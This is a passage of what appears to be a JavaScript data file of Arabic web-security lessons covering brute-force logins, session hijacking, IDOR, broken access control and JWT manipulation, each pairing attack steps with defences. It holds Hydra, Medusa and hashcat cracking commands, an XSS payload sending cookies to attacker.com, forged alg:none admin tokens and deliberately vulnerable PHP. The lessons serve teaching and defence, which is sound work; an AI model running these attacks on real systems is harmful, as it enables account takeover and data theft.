        <p>1. اسم المستخدم.</p>
        <p>2. قائمة كلمات مرور.</p>
        <p>3. صفحة تسجيل الدخول.</p>

        <p>ثم تبدأ الأداة بتجربة كلمات المرور الواحدة تلو الأخرى.</p>

        <h3>مثال على صفحة تسجيل دخول:</h3>

        <pre><code>POST /login HTTP/1.1
Host: target.com

username=admin&password=test</code></pre>

        <h3>أنواع Brute Force:</h3>

        <h3>1. Simple Brute Force</h3>

        <p>تجربة جميع الاحتمالات الممكنة.</p>

        <h3>2. Dictionary Attack</h3>

        <p>استخدام قوائم كلمات مرور جاهزة.</p>

        <pre><code>123456
password
admin123
welcome</code></pre>

        <h3>3. Credential Stuffing</h3>

        <p>استخدام بيانات مسربة من مواقع أخرى.</p>

        <h3>4. Password Spraying</h3>

        <p>تجربة كلمة مرور واحدة على عدد كبير من الحسابات.</p>

        <pre><code>Spring2026!</code></pre>

        <h3>أسباب نجاح الهجوم:</h3>

        <p>1. كلمات مرور ضعيفة.</p>
        <p>2. عدم وجود Rate Limiting.</p>
        <p>3. غياب MFA.</p>
        <p>4. عدم قفل الحساب.</p>
        <p>5. رسائل خطأ واضحة.</p>

        <h3>اختبار الهجوم باستخدام Hydra:</h3>

        <pre><code>hydra -l admin -P passwords.txt
target.com http-post-form
"/login:username=^USER^&password=^PASS^:F=invalid"</code></pre>

        <h3>شرح الأمر:</h3>

        <p><b>-l admin :</b> اسم المستخدم.</p>

        <p><b>-P passwords.txt :</b> ملف كلمات المرور.</p>

        <p><b>F=invalid :</b> النص الذي يدل على فشل تسجيل الدخول.</p>

        <h3>اختبار SSH Brute Force:</h3>

        <pre><code>hydra -l root -P rockyou.txt ssh://192.168.1.10</code></pre>

        <h3>استخدام Medusa:</h3>

        <pre><code>medusa -h 192.168.1.10
-u admin
-P passwords.txt
-M ssh</code></pre>

        <h3>استخدام Ncrack:</h3>

        <pre><code>ncrack -p ssh 192.168.1.10</code></pre>

        <h3>استخدام Burp Suite Intruder:</h3>

        <p>يقوم المختبر بالتقاط طلب تسجيل الدخول ثم إرسال كلمات مرور متعددة.</p>

        <h3>مثال على طلب داخل Burp:</h3>

        <pre><code>POST /login HTTP/1.1

username=admin&password=§pass§</code></pre>

        <h3>علامات نجاح الهجوم:</h3>

        <p>1. اختلاف طول الاستجابة.</p>
        <p>2. تغيير Status Code.</p>
        <p>3. إعادة توجيه المستخدم.</p>
        <p>4. ظهور Dashboard.</p>

        <h3>User Enumeration:</h3>

        <p>بعض التطبيقات تكشف المستخدم الصحيح عبر رسائل مختلفة.</p>

        <pre><code>Invalid Password</code></pre>

        <p>بينما للحساب غير الموجود:</p>

        <pre><code>User Not Found</code></pre>

        <h3>Time-Based Enumeration:</h3>

        <p>بعض الأنظمة تستغرق وقتاً أطول للتحقق من المستخدم الصحيح.</p>

        <h3>قوائم كلمات المرور الشهيرة:</h3>

        <pre><code>rockyou.txt
SecLists
Probable-Wordlists</code></pre>

        <h3>أماكن شائعة للهجوم:</h3>

        <p>1. صفحات تسجيل الدخول.</p>
        <p>2. SSH.</p>
        <p>3. FTP.</p>
        <p>4. البريد الإلكتروني.</p>
        <p>5. VPN.</p>
        <p>6. لوحات الإدارة.</p>

        <h3>Brute Force ضد APIs:</h3>

        <pre><code>POST /api/login
{
"user":"admin",
"password":"123456"
}</code></pre>

        <h3>اختبار Rate Limiting:</h3>

        <p>يقوم المختبر بإرسال مئات الطلبات بسرعة لمعرفة إذا كان النظام يوقف المحاولات.</p>

        <h3>أدوات Brute Force الشهيرة:</h3>

        <pre><code>Hydra
Medusa
Ncrack
Burp Suite Intruder
Patator</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام كلمات مرور قوية.</b></p>

        <p><b>2. تطبيق Multi-Factor Authentication (MFA).</b></p>

        <p><b>3. استخدام Rate Limiting.</b></p>

        <p><b>4. قفل الحساب بعد عدة محاولات فاشلة.</b></p>

        <p><b>5. استخدام CAPTCHA.</b></p>

        <p><b>6. مراقبة محاولات تسجيل الدخول المشبوهة.</b></p>

        <p><b>7. منع User Enumeration.</b></p>

        <h3>مثال على رسالة خطأ آمنة:</h3>

        <pre><code>Invalid Username or Password</code></pre>

        <p>بدلاً من كشف أي جزء صحيح.</p>

        <h3>مثال على سياسة قفل الحساب:</h3>

        <pre><code>5 Failed Attempts
Lock for 15 Minutes</code></pre>

        <h3>خطورة الهجوم:</h3>

        <p>يسمح Brute Force Login Attack للمهاجم باختراق الحسابات الضعيفة، والوصول إلى البيانات الحساسة، والسيطرة على الأنظمة والخوادم إذا لم توجد حماية مناسبة ضد محاولات التخمين الآلية.</p>
    `
},


{
    "title": "Session Hijacking باستخدام Cookies",
    "summary": `
        <p>تعتبر ثغرة <b>Session Hijacking</b> من أخطر هجمات اختطاف الحسابات، وتعتمد على سرقة Session Cookie الخاصة بالمستخدم ثم استخدامها لانتحال هويته داخل الموقع.</p>

        <p>عندما يسجل المستخدم الدخول يقوم الخادم بإنشاء Session ID فريد يتم تخزينه داخل Cookie في المتصفح.</p>

        <p>إذا تمكن المهاجم من الحصول على هذه الـ Cookie يستطيع الدخول إلى الحساب بدون معرفة كلمة المرور.</p>

        <h3>ما هي Sessions ؟</h3>

        <p>الجلسة Session هي آلية تستخدمها المواقع لتتبع المستخدم بعد تسجيل الدخول.</p>

        <p>مثال على Session Cookie:</p>

        <pre><code>PHPSESSID=abx91kd82mza</code></pre>

        <p>يقوم المتصفح بإرسال هذه القيمة مع كل طلب.</p>

        <h3>كيف يحدث Session Hijacking ؟</h3>

        <p>يحدث الهجوم عندما ينجح المهاجم في سرقة Session ID الخاصة بالضحية.</p>

        <h3>طرق سرقة Cookies:</h3>

        <p>1. XSS.</p>
        <p>2. الشبكات غير المشفرة HTTP.</p>
        <p>3. Malware.</p>
        <p>4. Man-in-the-Middle.</p>
        <p>5. Session Fixation.</p>

        <h3>سرقة الكوكيز عبر XSS:</h3>

        <pre><code>&lt;script&gt;
fetch('http://attacker.com/steal?cookie=' + document.cookie)
&lt;/script&gt;</code></pre>

        <p>إذا لم تكن الكوكيز محمية بـ HttpOnly سيتمكن المهاجم من قراءتها.</p>

        <h3>التقاط Session عبر HTTP:</h3>

        <p>إذا كان الموقع يستخدم HTTP بدلاً من HTTPS يمكن اعتراض الكوكيز أثناء انتقالها.</p>

        <h3>مثال على Cookie:</h3>

        <pre><code>Cookie: PHPSESSID=abcdef123456</code></pre>

        <h3>استخدام Session المسروقة:</h3>

        <p>يقوم المهاجم بإضافة الكوكيز داخل المتصفح أو Burp Suite.</p>

        <pre><code>Cookie: PHPSESSID=abcdef123456</code></pre>

        <p>بعد ذلك يصبح الموقع يعتبره المستخدم الحقيقي.</p>

        <h3>اختبار Session Hijacking باستخدام Burp Suite:</h3>

        <p>يقوم المختبر بالتقاط الطلبات ثم تعديل قيمة Cookie.</p>

        <pre><code>GET /dashboard HTTP/1.1
Host: target.com
Cookie: PHPSESSID=abcdef123456</code></pre>

        <h3>Session Fixation:</h3>

        <p>في بعض التطبيقات لا يتم إنشاء Session جديدة بعد تسجيل الدخول.</p>

        <p>يقوم المهاجم بإرسال Session ID ثابت للضحية:</p>

        <pre><code>PHPSESSID=ATTACKER123</code></pre>

        <p>إذا استخدمت الضحية نفس Session بعد تسجيل الدخول سيتمكن المهاجم من اختطاف الحساب.</p>

        <h3>علامات ضعف الجلسات:</h3>

        <p>1. Session IDs قصيرة أو متوقعة.</p>
        <p>2. عدم استخدام HTTPS.</p>
        <p>3. عدم استخدام HttpOnly.</p>
        <p>4. عدم تجديد Session بعد تسجيل الدخول.</p>
        <p>5. انتهاء جلسات غير صحيح.</p>

        <h3>مثال على Session ضعيفة:</h3>

        <pre><code>PHPSESSID=12345</code></pre>

        <h3>مثال على Session قوية:</h3>

        <pre><code>PHPSESSID=f8A91dP2XzQ7LmT83vK</code></pre>

        <h3>اختبار ثبات Session:</h3>

        <p>يقوم المختبر بتسجيل الخروج ثم إعادة استخدام نفس Session لمعرفة إذا كانت ما زالت فعالة.</p>

        <h3>أدوات اختبار Session Hijacking:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Cookie Editor
Wireshark
Ettercap</code></pre>

        <h3>اختبار عبر JavaScript:</h3>

        <pre><code>document.cookie</code></pre>

        <p>إذا ظهرت Session داخل المتصفح فهذا يعني أن HttpOnly غير مفعلة.</p>

        <h3>أماكن شائعة لاستهداف الجلسات:</h3>

        <p>1. لوحات الإدارة.</p>
        <p>2. الحسابات البنكية.</p>
        <p>3. البريد الإلكتروني.</p>
        <p>4. أنظمة CMS.</p>
        <p>5. التطبيقات السحابية.</p>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام HTTPS دائماً.</b></p>

        <p><b>2. تفعيل HttpOnly للكوكيز.</b></p>

        <pre><code>Set-Cookie: PHPSESSID=abc;
HttpOnly</code></pre>

        <h3>3. تفعيل Secure Cookies:</h3>

        <pre><code>Set-Cookie: PHPSESSID=abc;
Secure</code></pre>

        <h3>4. استخدام SameSite:</h3>

        <pre><code>SameSite=Strict</code></pre>

        <h3>5. تجديد Session بعد تسجيل الدخول:</h3>

        <pre><code>session_regenerate_id(true);</code></pre>

        <h3>6. إنهاء الجلسة بعد تسجيل الخروج.</h3>

        <h3>7. تحديد مدة صلاحية قصيرة للجلسات.</h3>

        <h3>8. ربط Session بعنوان IP أو User-Agent.</h3>

        <h3>مثال على إعداد آمن:</h3>

        <pre><code>Set-Cookie:
PHPSESSID=randomvalue;
HttpOnly;
Secure;
SameSite=Strict</code></pre>

        <h3>خطورة الهجوم:</h3>

        <p>يسمح Session Hijacking للمهاجم بالوصول الكامل إلى حسابات المستخدمين بدون معرفة كلمات المرور، وقد يؤدي إلى اختراق الحسابات الإدارية، سرقة البيانات الحساسة، والسيطرة الكاملة على التطبيق.</p>
    `
},


{
    "title": "Insecure Direct Object Reference (IDOR)",
    "summary": `
        <p>تعتبر ثغرة <b>Insecure Direct Object Reference (IDOR)</b> من أخطر ثغرات التحكم بالوصول (Access Control)، وتحدث عندما يسمح التطبيق للمستخدم بالوصول إلى كائنات أو بيانات مباشرة عبر معرفات IDs بدون التحقق من الصلاحيات.</p>

        <p>يمكن للمهاجم استغلال الثغرة للوصول إلى بيانات مستخدمين آخرين أو تعديلها فقط عبر تغيير رقم ID داخل الطلب.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>بعض التطبيقات تعتمد على IDs مباشرة داخل الروابط أو الطلبات.</p>

        <p>مثال:</p>

        <pre><code>http://target.com/profile?id=1001</code></pre>

        <p>إذا لم يتحقق الخادم من صلاحية المستخدم يستطيع المهاجم تغيير الرقم:</p>

        <pre><code>http://target.com/profile?id=1002</code></pre>

        <p>وبذلك يتم الوصول إلى حساب مستخدم آخر.</p>

        <h3>مثال على كود PHP ضعيف:</h3>

        <pre><code>// Vulnerable Example

$id = $_GET['id'];

$query = "SELECT * FROM users WHERE id='$id'";</code></pre>

        <p>الكود يقوم بجلب البيانات مباشرة بدون التحقق من هوية المستخدم الحالي.</p>

        <h3>مثال على تطبيق آمن:</h3>

        <pre><code>// Secure Example

$id = $_SESSION['user_id'];

$query = "SELECT * FROM users WHERE id='$id'";</code></pre>

        <h3>أنواع IDOR:</h3>

        <h3>1. قراءة بيانات مستخدمين آخرين</h3>

        <pre><code>/invoice?id=500</code></pre>

        <h3>2. تعديل بيانات مستخدمين</h3>

        <pre><code>POST /update-profile
id=5</code></pre>

        <h3>3. حذف بيانات</h3>

        <pre><code>/delete?id=10</code></pre>

        <h3>4. الوصول إلى ملفات خاصة</h3>

        <pre><code>/download?file=report.pdf</code></pre>

        <h3>5. IDOR داخل APIs</h3>

        <pre><code>GET /api/users/1001</code></pre>

        <h3>مثال عملي على الاستغلال:</h3>

        <p>المستخدم الحالي يملك:</p>

        <pre><code>/orders?id=150</code></pre>

        <p>يقوم المهاجم بتغيير الرقم:</p>

        <pre><code>/orders?id=151</code></pre>

        <p>إذا ظهرت بيانات مستخدم آخر فالثغرة موجودة.</p>

        <h3>اختبار IDOR داخل APIs:</h3>

        <pre><code>GET /api/account/2001 HTTP/1.1
Authorization: Bearer TOKEN</code></pre>

        <p>يقوم المختبر بتغيير الرقم إلى حساب آخر.</p>

        <h3>اختبار UUID:</h3>

        <p>بعض التطبيقات تستخدم UUID بدلاً من أرقام متسلسلة:</p>

        <pre><code>/profile?id=9d7f2a1b</code></pre>

        <p>لكن إذا لم يتم التحقق من الصلاحيات تبقى الثغرة موجودة.</p>

        <h3>أماكن شائعة لوجود IDOR:</h3>

        <p>1. صفحات الحسابات.</p>
        <p>2. الفواتير والطلبات.</p>
        <p>3. ملفات التحميل.</p>
        <p>4. APIs.</p>
        <p>5. أنظمة إدارة المحتوى.</p>
        <p>6. تطبيقات الجوال.</p>

        <h3>علامات تدل على وجود IDOR:</h3>

        <p>1. استخدام IDs داخل الروابط.</p>
        <p>2. IDs متسلسلة.</p>
        <p>3. غياب التحقق من الصلاحيات.</p>
        <p>4. إمكانية الوصول لبيانات مستخدمين آخرين.</p>

        <h3>اختبار IDOR باستخدام Burp Suite:</h3>

        <p>يقوم المختبر بالتقاط الطلب ثم تعديل:</p>

        <pre><code>id=1001 → id=1002</code></pre>

        <p>ثم يراقب الاستجابة.</p>

        <h3>استغلال الثغرة داخل JSON APIs:</h3>

        <pre><code>{
"user_id": 5001
}</code></pre>

        <p>يقوم المهاجم بتغيير الرقم إلى مستخدم آخر.</p>

        <h3>Horizontal Privilege Escalation:</h3>

        <p>الوصول إلى حساب مستخدم آخر بنفس الصلاحيات.</p>

        <h3>Vertical Privilege Escalation:</h3>

        <p>الوصول إلى حساب مدير أو مسؤول.</p>

        <h3>اختبار رفع الصلاحيات:</h3>

        <pre><code>/admin/profile?id=1</code></pre>

        <h3>أدوات اكتشاف IDOR:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Postman
ffuf
Autorize Extension</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. التحقق من الصلاحيات على مستوى الخادم.</b></p>

        <p><b>2. عدم الاعتماد على IDs القادمة من المستخدم.</b></p>

        <p><b>3. استخدام Access Control قوي.</b></p>

        <p><b>4. استخدام UUID لتقليل التخمين.</b></p>

        <p><b>5. التحقق من ملكية البيانات قبل عرضها.</b></p>

        <h3>مثال على تحقق آمن:</h3>

        <pre><code>// Secure Example

if($_SESSION['user_id'] != $requested_id) {
    die("Access Denied");
}</code></pre>

        <h3>التحقق داخل SQL:</h3>

        <pre><code>SELECT * FROM orders
WHERE id=? AND user_id=?</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر IDOR من أخطر ثغرات التحكم بالوصول لأنها قد تسمح بسرقة بيانات المستخدمين، الوصول إلى الحسابات، تعديل البيانات، أو حتى السيطرة على حسابات المدراء إذا لم يتم التحقق من الصلاحيات بشكل صحيح.</p>
    `
},



{
    "title": "Broken Access Control",
    "summary": `
        <p>تعتبر ثغرة <b>Broken Access Control</b> من أخطر ثغرات تطبيقات الويب، وتحدث عندما يفشل التطبيق في فرض قيود الوصول والصلاحيات بشكل صحيح.</p>

        <p>تسمح هذه الثغرة للمهاجم بالوصول إلى وظائف أو بيانات أو صفحات غير مصرح له بها، وقد تؤدي إلى السيطرة الكاملة على التطبيق.</p>

        <h3>ما المقصود بـ Access Control ؟</h3>

        <p>هو النظام المسؤول عن تحديد:</p>

        <p>1. من يستطيع الوصول.</p>
        <p>2. ماذا يستطيع المستخدم فعله.</p>
        <p>3. ما هي البيانات المسموح له برؤيتها.</p>

        <h3>أنواع التحكم بالوصول:</h3>

        <h3>1. Vertical Access Control</h3>

        <p>التحكم بين المستخدم العادي والمدير.</p>

        <h3>2. Horizontal Access Control</h3>

        <p>منع المستخدم من الوصول إلى بيانات مستخدم آخر.</p>

        <h3>3. Context-Dependent Access Control</h3>

        <p>التحكم حسب حالة العملية أو الجلسة.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>تحدث عندما يعتمد التطبيق على الواجهة الأمامية فقط أو يفشل في التحقق من الصلاحيات داخل الخادم.</p>

        <h3>مثال على صفحة إدارية:</h3>

        <pre><code>http://target.com/admin</code></pre>

        <p>إذا استطاع المستخدم العادي فتح الصفحة مباشرة فالثغرة موجودة.</p>

        <h3>مثال على كود ضعيف:</h3>

        <pre><code>// Vulnerable Example

if($_GET['role'] == 'admin') {
    showAdminPanel();
}</code></pre>

        <p>يعتمد التطبيق على قيمة قادمة من المستخدم.</p>

        <h3>مثال عملي على Vertical Privilege Escalation:</h3>

        <pre><code>POST /update-role

role=admin</code></pre>

        <p>إذا قبل الخادم الطلب قد يحصل المستخدم على صلاحيات مدير.</p>

        <h3>مثال على Horizontal Privilege Escalation:</h3>

        <pre><code>/profile?id=1001</code></pre>

        <p>يقوم المهاجم بتغيير الرقم:</p>

        <pre><code>/profile?id=1002</code></pre>

        <p>إذا ظهرت بيانات مستخدم آخر فهذا يعني وجود Broken Access Control.</p>

        <h3>Forced Browsing:</h3>

        <p>بعض الصفحات تكون مخفية من الواجهة لكن يمكن الوصول إليها مباشرة.</p>

        <pre><code>/admin
/dashboard
/backup.zip</code></pre>

        <h3>اختبار APIs:</h3>

        <pre><code>GET /api/admin/users HTTP/1.1</code></pre>

        <p>إذا تمكن المستخدم العادي من الوصول فالثغرة موجودة.</p>

        <h3>تجاوز التحكم عبر تغيير Cookies:</h3>

        <pre><code>role=user</code></pre>

        <p>يقوم المهاجم بتعديلها إلى:</p>

        <pre><code>role=admin</code></pre>

        <h3>تجاوز JWT Tokens:</h3>

        <p>بعض التطبيقات تحفظ الصلاحيات داخل JWT.</p>

        <pre><code>{
"role":"user"
}</code></pre>

        <p>إذا لم يتم التحقق من التوقيع يستطيع المهاجم تعديلها إلى:</p>

        <pre><code>{
"role":"admin"
}</code></pre>

        <h3>أماكن شائعة لوجود Broken Access Control:</h3>

        <p>1. لوحات الإدارة.</p>
        <p>2. APIs.</p>
        <p>3. صفحات الحسابات.</p>
        <p>4. أنظمة CMS.</p>
        <p>5. تطبيقات الجوال.</p>

        <h3>علامات تدل على وجود الثغرة:</h3>

        <p>1. إمكانية الوصول لصفحات إدارية.</p>
        <p>2. تغيير IDs للوصول لبيانات أخرى.</p>
        <p>3. تعديل الصلاحيات داخل الطلبات.</p>
        <p>4. غياب التحقق داخل الخادم.</p>

        <h3>اختبار الثغرة باستخدام Burp Suite:</h3>

        <p>يقوم المختبر بتعديل:</p>

        <pre><code>IDs
Cookies
Headers
JWT Tokens
POST Parameters</code></pre>

        <h3>اختبار Hidden Functions:</h3>

        <pre><code>/admin/delete-user
/admin/export-db</code></pre>

        <h3>اختبار HTTP Methods:</h3>

        <pre><code>GET /admin
POST /admin
PUT /admin</code></pre>

        <p>أحياناً يتم حماية Method وترك أخرى بدون حماية.</p>

        <h3>أدوات اكتشاف Broken Access Control:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Postman
Autorize Extension
ffuf</code></pre>

        <h3>مثال على تحقق آمن:</h3>

        <pre><code>// Secure Example

if($_SESSION['role'] !== 'admin') {
    die("Access Denied");
}</code></pre>

        <h3>التحقق داخل كل طلب:</h3>

        <p>يجب تنفيذ التحقق من الصلاحيات داخل الخادم وليس الواجهة الأمامية.</p>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. تطبيق Access Control داخل الخادم.</b></p>

        <p><b>2. التحقق من صلاحيات كل طلب.</b></p>

        <p><b>3. استخدام مبدأ أقل الصلاحيات.</b></p>

        <p><b>4. عدم الاعتماد على بيانات قادمة من المستخدم.</b></p>

        <p><b>5. حماية جميع APIs والصفحات الحساسة.</b></p>

        <p><b>6. تسجيل ومراقبة محاولات الوصول غير المصرح بها.</b></p>

        <p><b>7. استخدام Role-Based Access Control (RBAC).</b></p>

        <h3>مثال على RBAC:</h3>

        <pre><code>Admin → Full Access
Editor → Edit Content
User → Read Only</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر Broken Access Control من أخطر ثغرات الويب لأنها قد تسمح للمهاجم بالوصول إلى بيانات المستخدمين، تنفيذ وظائف إدارية، حذف أو تعديل البيانات، أو السيطرة الكاملة على التطبيق والخادم.</p>
    `
},



{
    "title": "JWT Token Manipulation",
    "summary": `
        <p>تعتبر ثغرة <b>JWT Token Manipulation</b> من أخطر ثغرات المصادقة الحديثة، وتحدث عندما يفشل التطبيق في حماية أو التحقق من JSON Web Tokens (JWT) بشكل صحيح.</p>

        <p>يمكن للمهاجم استغلال هذه الثغرة لتعديل بيانات المستخدم داخل التوكن، تجاوز المصادقة، أو الحصول على صلاحيات إدارية.</p>

        <h3>ما هو JWT ؟</h3>

        <p>JWT اختصار لـ <b>JSON Web Token</b>، وهو Token يستخدم لنقل بيانات المصادقة بين العميل والخادم.</p>

        <h3>بنية JWT:</h3>

        <pre><code>HEADER.PAYLOAD.SIGNATURE</code></pre>

        <h3>مثال على JWT:</h3>

        <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.
eyJ1c2VyIjoibW9oYW1lZCIsInJvbGUiOiJ1c2VyIn0
.
abc123signature</code></pre>

        <h3>شرح أجزاء JWT:</h3>

        <h3>1. Header</h3>

        <p>يحدد نوع التوكن وخوارزمية التوقيع.</p>

        <pre><code>{
"alg":"HS256",
"typ":"JWT"
}</code></pre>

        <h3>2. Payload</h3>

        <p>يحتوي على بيانات المستخدم والصلاحيات.</p>

        <pre><code>{
"user":"mohamed",
"role":"user"
}</code></pre>

        <h3>3. Signature</h3>

        <p>تستخدم للتحقق من صحة التوكن ومنع التعديل عليه.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>تحدث عندما لا يتحقق الخادم بشكل صحيح من التوقيع أو يستخدم إعدادات ضعيفة.</p>

        <h3>تعديل Payload:</h3>

        <p>يقوم المهاجم بفك تشفير التوكن ثم تعديل الصلاحيات.</p>

        <pre><code>{
"user":"mohamed",
"role":"admin"
}</code></pre>

        <p>إذا لم يتحقق الخادم من التوقيع سيتم قبول التوكن.</p>

        <h3>JWT None Algorithm Attack:</h3>

        <p>بعض التطبيقات القديمة تقبل خوارزمية:</p>

        <pre><code>"alg":"none"</code></pre>

        <p>يقوم المهاجم بحذف التوقيع بالكامل.</p>

        <h3>مثال:</h3>

        <pre><code>{
"alg":"none",
"typ":"JWT"
}</code></pre>

        <p>ثم يرسل Token بدون Signature.</p>

        <h3>Weak Secret Key:</h3>

        <p>إذا استخدم التطبيق مفتاح توقيع ضعيف يستطيع المهاجم تخمينه.</p>

        <pre><code>secret
123456
password</code></pre>

        <h3>اختبار JWT باستخدام jwt_tool:</h3>

        <pre><code>python3 jwt_tool.py TOKEN -C -d wordlist.txt</code></pre>

        <h3>اختبار باستخدام Hashcat:</h3>

        <pre><code>hashcat -m 16500 jwt.txt rockyou.txt</code></pre>

        <h3>تعديل JWT داخل Burp Suite:</h3>

        <p>يقوم المختبر بفك التوكن ثم تعديل Payload.</p>

        <pre><code>{
"role":"admin"
}</code></pre>

        <h3>استغلال Expiration:</h3>

        <p>بعض التطبيقات لا تتحقق من انتهاء صلاحية التوكن.</p>

        <pre><code>{
"exp":9999999999
}</code></pre>

        <h3>JWT Information Disclosure:</h3>

        <p>بعض التطبيقات تحفظ بيانات حساسة داخل Payload.</p>

        <pre><code>{
"password":"123456",
"ssn":"999999"
}</code></pre>

        <p>يمكن لأي شخص قراءة Payload لأنها Base64 وليست Encryption.</p>

        <h3>أماكن شائعة لاستخدام JWT:</h3>

        <p>1. APIs.</p>
        <p>2. تطبيقات الجوال.</p>
        <p>3. Single Page Applications.</p>
        <p>4. أنظمة OAuth.</p>
        <p>5. الخدمات السحابية.</p>

        <h3>علامات تدل على وجود ضعف:</h3>

        <p>1. قبول alg:none.</p>
        <p>2. مفاتيح ضعيفة.</p>
        <p>3. عدم التحقق من Signature.</p>
        <p>4. عدم التحقق من exp.</p>
        <p>5. حفظ بيانات حساسة داخل Payload.</p>

        <h3>اختبار JWT داخل الطلبات:</h3>

        <pre><code>Authorization: Bearer JWT_TOKEN</code></pre>

        <h3>أدوات اختبار JWT:</h3>

        <pre><code>jwt_tool
Burp Suite JWT Editor
Hashcat
John the Ripper
Postman</code></pre>

        <h3>مثال على JWT آمن:</h3>

        <pre><code>{
"alg":"RS256",
"typ":"JWT"
}</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. منع استخدام alg:none.</b></p>

        <p><b>2. استخدام مفاتيح قوية وعشوائية.</b></p>

        <p><b>3. التحقق من Signature دائماً.</b></p>

        <p><b>4. استخدام RS256 أو ES256.</b></p>

        <p><b>5. التحقق من exp و iat و nbf.</b></p>

        <p><b>6. عدم حفظ بيانات حساسة داخل Payload.</b></p>

        <p><b>7. تدوير المفاتيح بشكل دوري.</b></p>

        <h3>مثال على Secret قوي:</h3>

        <pre><code>8xP#92Lm!QaZ$7vT@2026</code></pre>

        <h3>مثال على تحقق آمن:</h3>

        <pre><code>jwt.verify(token, SECRET_KEY)</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تسمح JWT Token Manipulation للمهاجم بتجاوز المصادقة، انتحال المستخدمين، رفع الصلاحيات إلى مدير، أو الوصول الكامل إلى APIs والتطبيقات إذا لم يتم التحقق من التوكن بشكل صحيح.</p>
    `
},


{
    "title": "JWT None Algorithm Exploit",
    "summary": `
        <p>تعتبر ثغرة <b>JWT None Algorithm Exploit</b> من أخطر ثغرات JSON Web Tokens، وتحدث عندما يقبل الخادم JWT تستخدم الخوارزمية <code>alg:none</code> بدون التحقق من التوقيع.</p>

        <p>تسمح هذه الثغرة للمهاجم بإنشاء JWT مزيفة وتعديل الصلاحيات أو انتحال المستخدمين بدون معرفة المفتاح السري.</p>

        <h3>ما هو JWT ؟</h3>

        <p>JWT اختصار لـ <b>JSON Web Token</b> ويستخدم لنقل بيانات المصادقة بين العميل والخادم.</p>

        <h3>بنية JWT:</h3>

        <pre><code>HEADER.PAYLOAD.SIGNATURE</code></pre>

        <h3>أجزاء JWT:</h3>

        <h3>1. Header</h3>

        <p>يحدد نوع التوكن والخوارزمية المستخدمة.</p>

        <pre><code>{
"alg":"HS256",
"typ":"JWT"
}</code></pre>

        <h3>2. Payload</h3>

        <p>يحتوي على بيانات المستخدم والصلاحيات.</p>

        <pre><code>{
"user":"mohamed",
"role":"user"
}</code></pre>

        <h3>3. Signature</h3>

        <p>يستخدم للتحقق من صحة التوكن ومنع التعديل عليه.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>بعض التطبيقات القديمة أو الضعيفة تسمح باستخدام:</p>

        <pre><code>"alg":"none"</code></pre>

        <p>وهذا يعني عدم وجود توقيع Signature.</p>

        <p>إذا لم يتحقق الخادم من وجود توقيع حقيقي سيقبل أي JWT يرسلها المهاجم.</p>

        <h3>مثال على JWT طبيعية:</h3>

        <pre><code>{
"alg":"HS256",
"typ":"JWT"
}</code></pre>

        <h3>يقوم المهاجم بتعديلها إلى:</h3>

        <pre><code>{
"alg":"none",
"typ":"JWT"
}</code></pre>

        <h3>ثم يعدل Payload:</h3>

        <pre><code>{
"user":"admin",
"role":"admin"
}</code></pre>

        <h3>ثم يحذف Signature بالكامل.</h3>

        <h3>النتيجة النهائية:</h3>

        <pre><code>HEADER.PAYLOAD.</code></pre>

        <p>لاحظ وجود نقطة أخيرة بدون توقيع.</p>

        <h3>مثال عملي:</h3>

        <pre><code>{
"alg":"none",
"typ":"JWT"
}

{
"user":"admin",
"role":"admin"
}</code></pre>

        <h3>إذا قبل الخادم التوكن سيتم تسجيل الدخول كمدير.</h3>

        <h3>اختبار الثغرة باستخدام Burp Suite:</h3>

        <p>يقوم المختبر بفك JWT ثم:</p>

        <p>1. تغيير alg إلى none.</p>
        <p>2. حذف Signature.</p>
        <p>3. تعديل الصلاحيات داخل Payload.</p>

        <h3>مثال داخل الطلب:</h3>

        <pre><code>Authorization: Bearer JWT_TOKEN</code></pre>

        <h3>اختبار باستخدام jwt_tool:</h3>

        <pre><code>python3 jwt_tool.py TOKEN -X a</code></pre>

        <p>يقوم الأداة بتجربة هجوم alg:none تلقائياً.</p>

        <h3>أماكن شائعة لاستخدام JWT:</h3>

        <p>1. REST APIs.</p>
        <p>2. تطبيقات الجوال.</p>
        <p>3. Single Page Applications.</p>
        <p>4. أنظمة OAuth.</p>
        <p>5. الخدمات السحابية.</p>

        <h3>علامات تدل على وجود الثغرة:</h3>

        <p>1. قبول JWT بدون Signature.</p>
        <p>2. إمكانية تعديل Payload بحرية.</p>
        <p>3. استخدام مكتبات JWT قديمة.</p>
        <p>4. غياب التحقق من الخوارزمية.</p>

        <h3>أدوات اختبار JWT None:</h3>

        <pre><code>jwt_tool
Burp Suite JWT Editor
Postman
OWASP ZAP</code></pre>

        <h3>الفرق بين HS256 و none:</h3>

        <p><b>HS256:</b> يستخدم توقيع HMAC للتحقق من التوكن.</p>

        <p><b>none:</b> لا يستخدم أي توقيع إطلاقاً.</p>

        <h3>مثال على تحقق ضعيف:</h3>

        <pre><code>jwt.decode(token, verify=False)</code></pre>

        <p>هذا يؤدي إلى قبول أي JWT.</p>

        <h3>مثال على تحقق آمن:</h3>

        <pre><code>jwt.verify(token, SECRET_KEY)</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. منع استخدام alg:none نهائياً.</b></p>

        <p><b>2. استخدام مكتبات JWT حديثة.</b></p>

        <p><b>3. التحقق من Signature دائماً.</b></p>

        <p><b>4. تحديد الخوارزميات المسموح بها فقط.</b></p>

        <p><b>5. استخدام RS256 أو ES256.</b></p>

        <p><b>6. تحديث مكتبات JWT باستمرار.</b></p>

        <h3>مثال على تحديد الخوارزمية:</h3>

        <pre><code>algorithms=['HS256']</code></pre>

        <h3>عدم الثقة بالـ Header:</h3>

